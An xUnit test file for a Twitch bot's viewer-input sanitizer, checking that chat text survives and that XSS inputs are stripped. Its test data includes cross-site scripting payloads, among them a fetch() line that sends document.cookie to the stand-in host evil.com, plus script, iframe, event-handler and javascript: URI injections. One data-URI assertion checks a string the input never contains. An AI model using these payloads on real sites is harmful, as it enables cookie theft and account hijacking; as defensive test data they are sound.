using PenguinTwitchBot.Helpers;
using Xunit;

namespace PenguinTwitchBot.Test.Helpers
{
    public class ViewerInputSanitizerTests
    {
        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        public void Sanitize_ReturnsEmpty_WhenNullOrWhitespace(string? input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.Equal(string.Empty, result);
        }

        [Theory]
        [InlineData("Hello chat!")]
        [InlineData("GG WP everyone")]
        [InlineData("I love this stream <3")]
        [InlineData("<3 <3 <3")]
        [InlineData("x < 5 and y > 2")]
        [InlineData("10 < 20 > 5")]
        public void Sanitize_PreservesSafeChatMessagesAndEmotes(string input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.Equal(input, result);
        }

        [Theory]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("<script src=\"http://evil.com/evil.js\"></script>")]
        [InlineData("<SCRIPT>alert(document.cookie)</SCRIPT>")]
        [InlineData("Hello <script>fetch('http://evil.com?c=' + document.cookie)</script> World")]
        public void Sanitize_StripsScriptTagsAndPayloads(string input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.DoesNotContain("script", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("alert", result);
            Assert.DoesNotContain("cookie", result);
        }

        [Theory]
        [InlineData("<iframe src=\"https://evil.com\"></iframe>")]
        [InlineData("<iframe src=\"javascript:alert(1)\">")]
        [InlineData("<object data=\"malicious.swf\"></object>")]
        [InlineData("<embed src=\"malicious.swf\"></embed>")]
        [InlineData("<svg onload=\"alert(1)\"><circle r=\"10\"/></svg>")]
        [InlineData("<style>body { display: none; }</style>")]
        [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">")]
        [InlineData("<form action=\"http://evil.com\"><input type=\"submit\"></form>")]
        public void Sanitize_StripsDangerousBlockAndEmbeddedTags(string input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.DoesNotContain("iframe", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("object", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("embed", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("svg", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("style", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("meta", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("form", result, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("<img src=\"x\" onerror=\"alert('xss')\">")]
        [InlineData("<body onload=\"alert('xss')\">")]
        [InlineData("<div onmouseover=\"alert(1)\">hover me</div>")]
        [InlineData("something onerror=alert(1) hello")]
        public void Sanitize_StripsInlineEventHandlers(string input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.DoesNotContain("onerror", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onload", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("onmouseover", result, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("javascript:alert(1)")]
        [InlineData("JAVASCRIPT:alert(1)")]
        [InlineData("vbscript:msgbox(1)")]
        [InlineData("data:text/html;base64,PHNjcmlwdD4=")]
        public void Sanitize_StripsExecutableUriSchemes(string input)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.DoesNotContain("javascript:", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("vbscript:", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("data:text/html:", result, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("<b>Bold</b>", "Bold")]
        [InlineData("<i>Italic</i>", "Italic")]
        [InlineData("<p>Line 1</p><p>Line 2</p>", "Line 1Line 2")]
        [InlineData("<a href=\"https://twitch.tv\">Twitch</a>", "Twitch")]
        public void Sanitize_StripsGeneralHtmlTagsLeavingContent(string input, string expected)
        {
            var result = ViewerInputSanitizer.Sanitize(input);
            Assert.Equal(expected, result);
        }
    }
}
